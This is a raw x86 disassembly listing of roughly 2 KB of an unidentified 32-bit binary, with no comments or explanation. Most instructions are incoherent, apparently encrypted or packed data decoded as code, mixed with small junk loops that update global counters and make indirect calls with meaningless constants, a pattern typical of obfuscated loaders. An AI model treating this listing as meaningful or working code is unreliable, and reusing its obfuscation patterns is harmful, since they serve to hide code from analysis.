  4126f8:	jp     0x412689
  4126fa:	pushf  
  4126fb:	inc    edi
  4126fc:	cmp    al,0xe9
  4126fe:	mov    DWORD PTR [ecx+0x75],ebx
  412701:	mov    ds:0xbffc9b50,al
  412706:	sbb    DWORD PTR ds:0xa86d3dfb,ebx
  41270c:	(bad)  
  41270d:	ja     0x41269d
  41270f:	clc    
  412710:	sahf   
  412711:	jge    0x4126b1
  412713:	cld    
  412714:	mov    ebx,0xcf76d736
  412719:	xor    dh,BYTE PTR [esi+esi*1-0x7aa2071]
  412720:	shl    DWORD PTR ds:0xb66f65aa,cl
  412726:	outs   dx,DWORD PTR ds:[esi]
  412727:	inc    ebp
  412728:	js     0x41271c
  41272a:	cmp    dl,bl
  41272c:	loopne 0x41277d
  41272e:	in     al,dx
  41272f:	adc    ecx,DWORD PTR [ecx+0x2581e44d]
  412735:	jbe    0x412734
  412737:	inc    edx
  412738:	add    BYTE PTR [eax],al
  41273a:	add    BYTE PTR [eax],al
  41273c:	add    cl,ch
  41273e:	sldt   WORD PTR [eax]
  412741:	add    BYTE PTR [ebx],dh
  412743:	leave  
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esi,DWORD PTR [eax+esi*4-0x30]
  4127c0:	or     al,0xc8
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x870707e
  4127ca:	dec    ebp
  4127cb:	push   edx
  4127cc:	fwait
  4127cd:	adc    DWORD PTR [esi-0x162a707],esi
  4127d3:	mov    ch,0x38
  4127d5:	imul   edi,DWORD PTR [ecx+0x353d9e99],0xffffffb7
  4127dc:	shl    BYTE PTR [edx+edx*4+0x571d52f1],0xf5
  4127e4:	jl     0x412800
  4127e6:	in     al,dx
  4127e7:	mov    al,0xc7
  4127e9:	push   esi
  4127ea:	hlt    
  4127eb:	ja     0x4127b7
  4127ed:	test   BYTE PTR [eax],0x2
  4127f0:	dec    edx
  4127f1:	pop    ebp
  4127f2:	neg    eax
  4127f4:	popf   
  4127f5:	adc    bl,BYTE PTR [edx-0x32]
  4127f8:	mov    esi,0xfaf51ac8
  4127fd:	jg     0x4127bf
  4127ff:	dec    edx
  412800:	mov    ebx,0xb796ff56
  412805:	lds    edx,FWORD PTR [edi-0x6b]
  412808:	addr16 dec ebx
  41280a:	aaa    
  41280b:	cli    
  41280c:	leave  
  41280d:	lahf   
  41280e:	data16 test BYTE PTR [edi+0x420c2308],bh
  412815:	dec    eax
  412816:	jp     0x41280a
  412818:	xchg   DWORD PTR [ebx-0x4f],esi
  41281b:	mov    bl,0x67
  41281d:	pop    esp
  41281e:	das    
  41281f:	fs cwde 
  412821:	sub    BYTE PTR [edi+0x55],0xbc
  412825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412826:	inc    ebx
  412827:	scas   eax,DWORD PTR es:[edi]
  412828:	cmp    al,0x4c
  41282a:	ret    0xe26
  41282d:	fist   DWORD PTR [edx+edi*4]
  412830:	inc    edx
  412831:	es jb  0x41287c
  412834:	push   ebx
  412835:	xchg   BYTE PTR [esi+0x5f],dh
  412838:	cmp    BYTE PTR [edi+ebp*2-0x6a],ah
  41283c:	(bad)  
  41283d:	cs sti 
  41283f:	rol    DWORD PTR [esi+ebp*8-0x6815ba65],0xe6
  412847:	fs loope 0x41285d
  41284a:	jmp    0xf3fa:0xec78ed12
  412851:	push   ss
  412852:	cld    
  412853:	sbb    BYTE PTR ds:0xa3ed35f1,ah
  412859:	daa    
  41285a:	and    al,0xc9
  41285c:	push   eax
  41285d:	inc    ebx
  41285e:	sar    esp,cl
  412860:	dec    esi
  412861:	lds    edi,FWORD PTR [ecx-0x64]
  412864:	mov    WORD PTR [ebp-0x6d7fff43],?
  41286a:	pop    esp
  41286b:	or     DWORD PTR [ecx],ebx
  41286d:	(bad)
  412870:	fldenv [esi]
  412872:	pop    edx
  412873:	push   edx
  412874:	je     0x412835
  412876:	std    
  412877:	mov    ds:0x57d70847,eax
  41287c:	cmp    esp,0xffffffd2
  41287f:	inc    eax
  412880:	out    dx,eax
  412881:	loope  0x41284d
  412883:	push   edx
  412884:	pop    edx
  412885:	ss dec edi
  412887:	jbe    0x412825
  412889:	sbb    DWORD PTR [ebx-0x6b],edx
  41288c:	cld    
  41288d:	xchg   edi,eax
  41288e:	dec    esp
  41288f:	maxps  xmm7,xmm3
  412892:	xor    DWORD PTR [edi],edx
  412894:	out    0xd,al
  412896:	xor    bl,cl
  412898:	sub    al,0xef
  41289a:	cld    
  41289b:	test   al,0x5b
  41289d:	dec    ebx
  41289e:	mov    ecx,0x38287db1
  4128a3:	sub    esp,0xffffffcc
  4128a6:	push   esi
  4128a7:	adc    cl,bl
  4128a9:	call   0x72bd:0x7dd5eb2
  4128b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b1:	int3   
  4128b2:	ja     0x412922
  4128b4:	rcl    DWORD PTR [ebp-0x4ce8c689],1
  4128ba:	ret    
  4128bb:	fcomp  DWORD PTR [edi]
  4128bd:	xchg   edi,eax
  4128be:	pop    ds
  4128bf:	ins    BYTE PTR es:[edi],dx
  4128c0:	enter  0x4e78,0x5d
  4128c4:	sti    
  4128c5:	push   ebp
  4128c6:	pop    es
  4128c7:	sub    BYTE PTR [edi+0x12ca1c3b],0xcb
  4128ce:	scas   eax,DWORD PTR es:[edi]
  4128cf:	pop    ss
  4128d0:	dec    cl
  4128d2:	push   edi
  4128d3:	dec    ecx
  4128d4:	push   edx
  4128d5:	add    ecx,eax
  4128d7:	push   ds
  4128d8:	in     al,dx
  4128d9:	xor    DWORD PTR [eax+0x16],ebx
  4128dc:	cmc    
  4128dd:	pushf  
  4128de:	pushf  
  4128df:	add    eax,0xa7b9b19
  4128e4:	mov    eax,0x8197f4f9
  4128e9:	dec    esi
  4128ea:	xchg   ebx,eax
  4128eb:	imul   edi,edx,0x29
  4128ee:	mov    ecx,0x209c2a2b
  4128f3:	jmp    0x41296e
  4128f5:	jecxz  0x4128b0
  4128f7:	mov    ebp,0x8c4264d4
  4128fc:	mov    ebp,edi
  4128fe:	jmp    0x412889
  412900:	and    al,bh
  412902:	mov    eax,0x32709a04
  412907:	out    dx,eax
  412908:	call   0x275c:0xc04e2298
  41290f:	sti    
  412910:	mov    edi,0x3f363d07
  412915:	xor    al,0xf
  412917:	lds    ecx,FWORD PTR cs:[esi+edi*4+0x2f9590d4]
  41291f:	imul   edx,edx,0x9
  412922:	xor    al,0x41
  412924:	push   edi
  412925:	lahf   
  412926:	sub    WORD PTR [edx],ax
  412929:	sbb    DWORD PTR [ebp-0x51472c6f],ebp
  41292f:	cmp    ebx,DWORD PTR [edi]
  412931:	fimul  DWORD PTR [ebp+0x4dfd4130]
  412937:	bound  ebp,QWORD PTR [ebx-0x47]
  41293a:	mov    dl,0xc0
  41293c:	jb     0x412986
  41293e:	test   al,0x95
  412940:	jmp    0x41296e
  412942:	sar    BYTE PTR [eax+0x544a8f01],1
  412948:	pop    edx
  412949:	les    ecx,FWORD PTR [edx]
  41294b:	sbb    edi,DWORD PTR [esp+edx*2-0x26]
  41294f:	dec    esp
  412950:	fdiv   st,st(2)
  412952:	mov    dl,0x47
  412954:	and    ebx,DWORD PTR [eax+0x6e]
  412957:	es mov WORD PTR gs:[ecx-0x16],ss
  41295c:	loope  0x4129c1
  41295e:	mov    ah,0xfe
  412960:	jno    0x41296c
  412962:	jl     0x41299f
  412964:	ins    BYTE PTR es:[edi],dx
  412965:	xchg   esi,eax
  412966:	push   esp
  412967:	nop
  412968:	push   es
  412969:	aad    0x32
  41296b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41296c:	add    edx,edx
  41296e:	mov    ds:0xee18ef0f,eax
  412973:	pop    edi
  412974:	sbb    DWORD PTR [edi-0x24],edx
  412977:	jmp    0xd0f0:0x1155e3af
  41297e:	test   al,0x62
  412980:	popf   
  412981:	(bad)  
  412982:	cmp    ebp,DWORD PTR ds:0xfecbb4cb
  412988:	aaa    
  412989:	xor    al,0xa
  41298b:	shl    DWORD PTR [ebx+0x3344b9d4],cl
  412991:	jne    0x4129cc
  412993:	clc    
  412994:	ds pop ds
  412996:	clc    
  412997:	and    dl,BYTE PTR [edx+0x33d63166]
  41299d:	(bad)  
  41299e:	js     0x4129dc
  4129a0:	rcr    edx,cl
  4129a2:	inc    eax
  4129a3:	in     al,0xa9
  4129a5:	loopne 0x41293f
  4129a7:	aam    0x12
  4129a9:	std    
  4129aa:	push   ebx
  4129ab:	pushf  
  4129ac:	ret    
  4129ad:	xchg   ebp,eax
  4129ae:	jnp    0x41296f
  4129b0:	inc    edx
  4129b1:	cmp    al,0x7e
  4129b3:	in     eax,0x23
  4129b5:	add    cl,dl
  4129b7:	enter  0x69e0,0x6f
  4129bb:	sar    eax,cl
  4129bd:	adc    DWORD PTR [edi-0x6e],edi
  4129c0:	jo     0x2ea019f0
  4129c6:	mov    DWORD PTR [ebp+0x56],ebx
  4129c9:	inc    ecx
  4129ca:	jae    0x412a1d
  4129cc:	cld    
  4129cd:	add    DWORD PTR [ebx+0x38],0x1d
  4129d1:	lahf   
  4129d2:	or     DWORD PTR [eax+0x6c],0xffffffd6
  4129d6:	mov    bl,0x5d
  4129d8:	jl     0x412962
  4129da:	aam    0xfb
  4129dc:	jecxz  0x41299a
  4129de:	sub    ebx,0xffffffb2
  4129e1:	mov    ebp,0x4b2c4b29
  4129e6:	int    0x7b
  4129e8:	pusha  
  4129e9:	pop    es
  4129ea:	or     eax,0x78a5fdb6
  4129ef:	inc    ecx
  4129f0:	call   DWORD PTR [edx]
  4129f2:	jno    0x4129c9
  4129f4:	fcom   QWORD PTR [ebp+0x7d907516]
  4129fa:	in     al,0x15
  4129fc:	popf   
  4129fd:	mov    edx,0x5293e599
  412a02:	imul   esp,DWORD PTR [esi],0xffffffac
  412a05:	inc    esi
  412a06:	lahf   
  412a07:	sub    BYTE PTR [edi],bh
  412a09:	jmp    FWORD PTR [esi+edi*1-0x47]
  412a0d:	test   ebx,ecx
  412a0f:	inc    edx
  412a10:	or     ecx,DWORD PTR [eax]
  412a12:	dec    ecx
  412a13:	fld    DWORD PTR [edi-0x30938acf]
  412a19:	xlat   BYTE PTR ds:[ebx]
  412a1a:	or     al,0x44
  412a1c:	add    BYTE PTR [ebp+0x35d9ae81],bl
  412a22:	test   edi,eax
  412a24:	and    BYTE PTR [eax],dl
  412a26:	sbb    al,0x21
  412a28:	push   ds
  412a29:	mov    esi,0x7c7d6b98
  412a2e:	arpl   WORD PTR gs:[ebp-0x1],si
  412a32:	pop    ebp
  412a33:	adc    DWORD PTR [ebp+0x76],ebp
  412a36:	sbb    al,dh
  412a38:	and    ecx,DWORD PTR [ebp-0x72497a56]
  412a3e:	(bad)  
  412a3f:	es push esi
  412a41:	outs   dx,BYTE PTR ds:[esi]
  412a42:	mov    ah,0x65
  412a44:	loope  0x4129d5
  412a46:	inc    ecx
  412a47:	out    0x54,eax
  412a49:	pop    edi
  412a4a:	pop    eax
  412a4b:	mov    eax,ds:0xaf18d9c8
  412a50:	push   ecx
  412a51:	push   ebx
  412a52:	call   0xc43cc521
  412a57:	ds xchg edi,eax
  412a59:	dec    ebx
  412a5a:	call   0x99b8:0xfda181
  412a61:	test   DWORD PTR [esi],eax
  412a63:	imul   esp,DWORD PTR [ebx+0x7118f560],0xffffffad
  412a6a:	fs ds jg 0x412ac8
  412a6e:	ret    
  412a6f:	mov    esp,0x43a3aa93
  412a74:	jmp    0xdfe6d43
  412a79:	ds mov cl,0xf9
  412a7c:	(bad)  [ecx]
  412a7e:	outs   dx,BYTE PTR ds:[esi]
  412a7f:	les    edi,FWORD PTR [edi+ebx*8-0x75]
  412a83:	mov    eax,ds:0x6503441e
  412a88:	dec    esi
  412a89:	sbb    edx,DWORD PTR [ecx-0x65a881f2]
  412a8f:	xor    ecx,DWORD PTR [edi]
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412af7
  412b3b:	cmp    BYTE PTR [ebx+0x60],bh
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b64
  412b47:	sbb    BYTE PTR [edi],0x68
  412b4a:	retf   
  412b4b:	sbb    al,ch
  412b4d:	sbb    BYTE PTR [edx-0x27d3dee4],ch
  412b53:	test   BYTE PTR [ecx-0x64],al
  412b56:	push   ss
  412b57:	cmp    bl,BYTE PTR [ebx]
  412b59:	or     BYTE PTR [eax+0x15],bh
  412b5c:	jmp    0x5e950f41
  412b61:	stos   BYTE PTR es:[edi],al
  412b62:	fwait
  412b63:	test   eax,0x5639a1d6
  412b68:	cld    
  412b69:	fcomp  DWORD PTR [eax-0x5b1daf61]
  412b6f:	neg    BYTE PTR [edi+0x3d]
  412b72:	mul    dl
  412b74:	pop    es
  412b75:	jl     0x412bb4
  412b77:	idiv   DWORD PTR [ecx+0x4d]
  412b7a:	mov    bl,0x75
  412b7c:	outs   dx,DWORD PTR ds:[esi]
  412b7d:	cmp    DWORD PTR [edx+0x1a584d8a],0x96ffca72
  412b87:	ins    BYTE PTR es:[edi],dx
  412b88:	adc    al,0xf3
  412b8a:	hlt    
  412b8b:	ins    BYTE PTR es:[edi],dx
  412b8c:	shr    BYTE PTR [esi+0x19],0x55
  412b90:	sahf   
  412b91:	jmp    0x16476eee
  412b96:	iret   
  412b97:	inc    ebx
  412b98:	jbe    0x412b3e
  412b9a:	aas    
  412b9b:	or     DWORD PTR [ebx+eiz*1],esi
  412b9e:	add    DWORD PTR [edi],0xb39cdb9b
  412ba4:	sub    ebx,ebx
  412ba6:	aaa    
  412ba7:	lods   eax,DWORD PTR ds:[esi]
  412ba8:	cmp    eax,DWORD PTR [ecx+0x3cac083f]
  412bae:	xor    eax,0xc856f9d0
  412bb3:	shl    cl,1
  412bb5:	int3   
  412bb6:	mov    al,ds:0x751a413a
  412bbb:	mov    bh,0x8d
  412bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbe:	int    0x1d
  412bc0:	cmc    
  412bc1:	push   esi
  412bc2:	lahf   
  412bc3:	(bad)  
  412bc5:	jbe    0x412c17
  412bc7:	mov    cs,WORD PTR [edi+edi*2-0x66]
  412bcb:	mov    ch,0xd9
  412bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bce:	push   ebx
  412bcf:	mov    dh,0xd0
  412bd1:	mov    ah,0x3c
  412bd3:	pop    edi
  412bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd5:	mov    ebp,0xaf83951
  412bda:	aad    0x8e
  412bdc:	in     al,dx
  412bdd:	pop    ecx
  412bde:	pop    ss
  412bdf:	sahf   
  412be0:	js     0x412bfa
  412be2:	lock (bad) 
  412be4:	lock sub DWORD PTR [eax+eiz*2+0x5d],0x3d18ac86
  412bed:	inc    edi
  412bee:	(bad)  [esi+0x21]
  412bf1:	daa    
  412bf2:	sbb    BYTE PTR [ebx],ah
  412bf4:	pop    esp
  412bf5:	jge    0x412c4e
  412bf7:	cmp    eax,0xba9f3931
  412bfc:	ret    
  412bfd:	rcl    DWORD PTR [eax-0x95b929a],cl
  412c03:	pop    eax
  412c04:	or     eax,0xf5b9baa9
  412c09:	dec    esi
  412c0a:	shl    DWORD PTR [esp+esi*2],1
  412c0d:	lahf   
  412c0e:	cmp    dl,bl
  412c10:	xchg   edi,eax
  412c11:	(bad)  
  412c12:	in     al,dx
  412c13:	inc    esi
  412c14:	fmul   DWORD PTR [edi]
  412c16:	mov    esp,0xc626a522
  412c1b:	data16 sbb ch,dl
  412c1e:	xchg   esi,eax
  412c1f:	addr16 hlt 
  412c21:	xchg   ecx,eax
  412c22:	inc    ecx
  412c23:	sub    bl,BYTE PTR [edi]
  412c25:	and    DWORD PTR [edx-0x35],eax
  412c28:	sahf   
  412c29:	jo     0x412c14
  412c2b:	xchg   DWORD PTR [ebp-0x299c88bf],edi
  412c31:	push   eax
  412c32:	shl    DWORD PTR [eax-0x56],1
  412c35:	pushf  
  412c36:	jmp    0x34c707b9
  412c3b:	cmc    
  412c3c:	int    0xb0
  412c3e:	sub    ebp,edi
  412c40:	dec    esi
  412c41:	imul   esi,DWORD PTR [ecx],0xffffffae
  412c44:	sbb    al,0xac
  412c46:	jae    0x412c1a
  412c48:	cmp    DWORD PTR [ebp+ebp*4+0x3318170d],esi
  412c4f:	ss int3 
  412c51:	jbe    0x412c73
  412c53:	(bad)  
  412c54:	pop    ebx
  412c55:	pop    edi
  412c56:	jge    0x412c10
  412c58:	leave  
  412c59:	dec    eax
  412c5a:	jae    0x412c84
  412c5c:	mov    ecx,0x9dc39730
  412c61:	repnz stos BYTE PTR es:[edi],al
  412c63:	mov    dx,0xa16f
  412c67:	aad    0xef
  412c69:	(bad)  
  412c6a:	fmul   DWORD PTR [esi-0x62]
  412c6d:	dec    esi
  412c6e:	imul   esp,DWORD PTR gs:[edx+0x59],0x5a
  412c73:	sub    DWORD PTR [eax+0x6d32a26b],0xca92d529
  412c7d:	jnp    0x412ca1
  412c7f:	push   ss
  412c80:	or     DWORD PTR [esi-0x3b090d6e],edi
  412c86:	mov    ebp,0x68935236
  412c8b:	inc    edx
  412c8c:	inc    ebx
  412c8d:	cdq    
  412c8e:	loope  0x412ca6
  412c90:	lods   eax,DWORD PTR ds:[esi]
  412c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c92:	add    ebp,DWORD PTR [edi-0x7f]
  412c95:	push   ss
  412c96:	mov    esi,0x519b6c7c
  412c9b:	enter  0xc9a8,0xb2
  412c9f:	xchg   DWORD PTR [ebp+edx*1-0x2c4d9109],edi
  412ca6:	(bad)  
  412ca7:	repz cmp DWORD PTR [edx+0x7a],esi
  412cab:	sub    al,0x53
  412cad:	retf   0x8848
  412cb0:	pusha  
  412cb1:	leave  
  412cb2:	add    eax,edi
  412cb4:	cld    
  412cb5:	pusha  
  412cb6:	inc    ecx
  412cb7:	mov    fs,WORD PTR [esi]
  412cb9:	sub    al,0x26
  412cbb:	pop    ss
  412cbc:	push   esi
  412cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cbe:	aas    
  412cbf:	cmp    dh,dh
  412cc1:	jae    0x412cd5
  412cc3:	sbb    eax,0xa750d10a
  412cc8:	retf   
  412cc9:	sbb    cl,BYTE PTR [ebx-0x28]
  412ccc:	mov    eax,ds:0xd9e01d54
  412cd1:	xchg   esi,ecx
  412cd3:	cmc    
  412cd4:	xchg   ebx,eax
  412cd5:	(bad)  
  412cd6:	mov    cl,0xef
  412cd8:	mov    dl,0xb2
  412cda:	cmp    DWORD PTR [eax],ebp
  412cdc:	xor    eax,0x5998b995
  412ce1:	fidiv  DWORD PTR [ebx+eiz*1-0x5cc109b5]
  412ce8:	add    cl,0xbc
  412ceb:	sbb    esi,DWORD PTR [edi-0x640e00b7]
  412cf1:	dec    eax
  412cf2:	out    0xf9,eax
  412cf4:	fstp   TBYTE PTR [esi-0x9562cf8]
  412cfa:	std    
  412cfb:	sub    ecx,edx
  412cfd:	aas    
  412cfe:	ja     0x412ca4
  412d00:	push   esp
  412d01:	call   0xbf3bb02b
  412d06:	in     eax,dx
  412d07:	adc    DWORD PTR [edi+0x5e1052c7],edi
  412d0d:	cmp    BYTE PTR [eax],ah
  412d0f:	jp     0x412d07
  412d11:	mul    DWORD PTR [eax+eiz*1+0xf]
  412d15:	inc    edi
  412d16:	push   ebx
  412d17:	fwait
  412d18:	cdq    
  412d19:	xor    ecx,edi
  412d1b:	cmp    cl,dh
  412d1d:	and    esp,edi
  412d1f:	dec    esp
  412d20:	icebp  
  412d21:	push   ds
  412d22:	jo     0x412d37
  412d24:	(bad)  
  412d25:	cmp    al,BYTE PTR [ecx+0x64]
  412d28:	imul   BYTE PTR [ebp-0x7c]
  412d2b:	pusha  
  412d2c:	inc    edi
  412d2d:	sub    cl,bh
  412d2f:	nop
  412d30:	lods   eax,DWORD PTR ds:[esi]
  412d31:	in     eax,0x37
  412d33:	test   DWORD PTR [edi+eiz*8],0xdc0b43ea
  412d3a:	or     BYTE PTR [edi+0x7cc79642],dl
  412d40:	in     al,0x48
  412d42:	daa    
  412d43:	call   0x19c6dfa8
  412d48:	sbb    al,0xa6
  412d4a:	je     0x412dc4
  412d4c:	mov    ds:0xe355a8d1,eax
  412d51:	pushf  
  412d52:	jo     0x412cd7
  412d54:	push   0x631871b3
  412d59:	xor    ah,BYTE PTR [ebp+eiz*1+0x58]
  412d5d:	sub    eax,DWORD PTR [ebx+eiz*1+0x5a]
  412d61:	call   0x1a7b215
  412d66:	push   cs
  412d67:	sub    al,0x7a
  412d69:	and    DWORD PTR [eax+0x42],esp
  412d6c:	sahf   
  412d6d:	xor    cl,BYTE PTR [edx-0x5]
  412d70:	fsubr  DWORD PTR [edi-0x5b]
  412d73:	pop    esp
  412d74:	inc    esp
  412d75:	push   cs
  412d76:	and    ch,cl
  412d78:	outs   dx,BYTE PTR ds:[esi]
  412d79:	ror    BYTE PTR [edi+0x31],1
  412d7c:	or     al,0xdb
  412d7e:	adc    edi,ebx
  412d80:	dec    edx
  412d81:	jb     0x412d8c
  412d83:	adc    al,0x3a
  412d85:	test   ebp,eax
  412d87:	pop    edx
  412d88:	push   eax
  412d89:	adc    DWORD PTR [ebx-0x50ec0755],esi
  412d8f:	xchg   ebp,eax
  412d90:	outs   dx,DWORD PTR ds:[esi]
  412d91:	pop    ss
  412d92:	(bad)  
  412d93:	in     al,dx
  412d94:	call   0xa405:0xbfd4cc51
  412d9b:	shl    DWORD PTR [edx+0x683b7a6b],1
  412da1:	imul   eax,DWORD PTR [ebx+0xa],0x3292fe82
  412da8:	jmp    0x7bdd:0x53ae3b5a
  412daf:	pushf  
  412db0:	adc    ch,ah
  412db2:	or     al,bh
  412db4:	fist   DWORD PTR [edi+esi*4-0x1cde3e86]
  412dbb:	pop    eax
  412dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dbd:	xchg   DWORD PTR [esi],edx
  412dbf:	jbe    0x412d57
  412dc1:	enter  0xea0a,0xc
  412dc5:	inc    eax
  412dc6:	mov    ch,0x5a
  412dc8:	jae    0x412e40
  412dca:	out    0x8c,eax
  412dcc:	sub    al,0x74
  412dcf:	push   cs
  412dd0:	into   
  412dd1:	sahf   
  412dd2:	mov    ecx,0xda5e45
  412dd7:	add    al,0x8a
  412dd9:	retf   0x75e9
  412ddc:	xchg   edi,eax
  412ddd:	int3   
  412dde:	push   0xfffffff0
  412de0:	in     al,dx
  412de1:	das    
  412de2:	or     eax,0x155e565b
  412de7:	xor    eax,0x778951c7
  412dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ded:	xchg   ebx,eax
  412dee:	shr    esp,cl
  412df0:	xor    esi,esp
  412df2:	and    esp,DWORD PTR [esi+0x64]
  412df5:	shr    BYTE PTR [ebx-0x3d],cl
  412df8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df9:	push   ecx
  412dfa:	sbb    BYTE PTR [edx+0x2da7faf9],dh
  412e00:	push   esi
  412e01:	retf   
  412e02:	shl    DWORD PTR ds:0xfb7332b0,0x3d
  412e09:	cmp    eax,DWORD PTR [eax+0x78]
  412e0c:	scas   eax,DWORD PTR es:[edi]
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [eax+ecx*2+0x645a3325],cx
  412e7b:	jo     0x412eed
  412e7d:	mov    ecx,0xb370707e
  412e82:	or     dl,BYTE PTR [ebx+0x43aaca3b]
  412e88:	sub    ebp,DWORD PTR [ebp-0x44]
  412e8b:	add    BYTE PTR [edi],ah
  412e8d:	pop    edx
  412e8e:	cli    
  412e8f:	push   edx
  412e90:	xchg   BYTE PTR [esp+ebx*2],bl
  412e93:	fldenv [eax]
  412e95:	inc    esp
  412e96:	pushf  
  412e97:	push   edx
  412e98:	xor    DWORD PTR [ebp-0x37],ecx
  412e9b:	ret    0xcdcd
  412e9e:	mov    bh,0xe9
  412ea0:	push   ss
  412ea1:	imul   ebx,DWORD PTR [ebx-0x4],0xde2b9788
  412ea8:	fnstcw WORD PTR [ecx]
  412eaa:	out    dx,al
  412eab:	inc    eax
  412eac:	cmp    al,0x35
  412eae:	sti    
  412eaf:	mov    ch,0xa5
  412eb1:	xor    esp,0xffffffa7
  412eb4:	dec    eax
  412eb5:	ins    BYTE PTR es:[edi],dx
  412eb6:	(bad)  
  412eb7:	loope  0x412ed2
  412eb9:	sub    eax,0x731dee0b
  412ebe:	mov    es,eax
  412ec0:	mov    esi,0x71ef8d32
  412ec5:	jnp    0x412ef7
  412ec7:	mov    ecx,0x8dced51
  412ecc:	dec    esp
  412ecd:	(bad)  
  412ece:	imul   esi,ebp,0x79
  412ed1:	cmp    eax,DWORD PTR [esi+0x37]
  412ed4:	pop    edi
  412ed5:	sti    
  412ed6:	outs   dx,DWORD PTR ds:[esi]
  412ed7:	sbb    BYTE PTR ds:0x709b675b,bl
  412edd:	sbb    eax,DWORD PTR [esi+0x6f]
  412ee0:	mov    ch,0xef
  412ee2:	adc    bh,BYTE PTR [edx-0x78]
  412ee5:	mov    fs,WORD PTR [edi-0x7a]
  412ee8:	dec    BYTE PTR [edx]
  412eea:	(bad)  
  412eeb:	(bad)  
  412eec:	pop    edi
  412eed:	pop    ds
  412eee:	push   esp
  412eef:	xchg   esp,eax
  412ef0:	lea    ebp,[esp+ebp*1]
  412ef3:	in     al,dx
  412ef4:	jle    0x412e9c
  412ef6:	es push ebx
  412ef8:	in     al,dx
  412ef9:	xchg   cl,ch
  412efb:	push   ds
  412efc:	mul    DWORD PTR [edi+0x45]
  412eff:	push   edi
  412f00:	cs mov edi,esi
  412f03:	cmp    edi,esp
  412f05:	xor    edi,0xea8b98af
  412f0b:	xchg   ecx,eax
  412f0c:	lock enter 0xb0ce,0x45
  412f11:	cmc    
  412f12:	jl     0x412e96
  412f14:	jge    0x412ed6
  412f16:	mov    ds:0xca947f9d,al
  412f1b:	mov    WORD PTR [ebx],fs
  412f1d:	xor    bh,BYTE PTR [ecx+0x6c]
  412f20:	nop
